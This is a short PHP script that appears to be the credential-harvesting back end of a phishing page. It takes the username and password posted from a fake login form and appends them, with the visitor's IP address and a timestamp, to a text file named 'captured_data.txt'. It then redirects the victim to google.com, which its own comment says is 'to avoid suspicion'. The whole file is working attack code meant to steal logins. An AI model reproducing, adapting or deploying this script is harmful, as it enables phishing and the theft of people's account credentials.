<?php
// Configuration: File where credentials will be stored
$log_file = 'captured_data.txt';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Sanitize input to prevent basic injection
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    $ip_address = $_SERVER['REMOTE_ADDR'];
    $timestamp = date("Y-m-d H:i:s");

    // Format the string for the text file
    $data_entry = "Time: $timestamp | IP: $ip_address | User: $username | Pass: $password\n";

    // Append the data to the log file
    file_put_contents($log_file, $data_entry, FILE_APPEND);

    // Redirect the user to a legitimate site to avoid suspicion
    header("Location: https://www.google.com");
    exit();
} else {
    // If the page is accessed directly without POST, redirect to the login page
    header("Location: index.html");
    exit();
}
?>
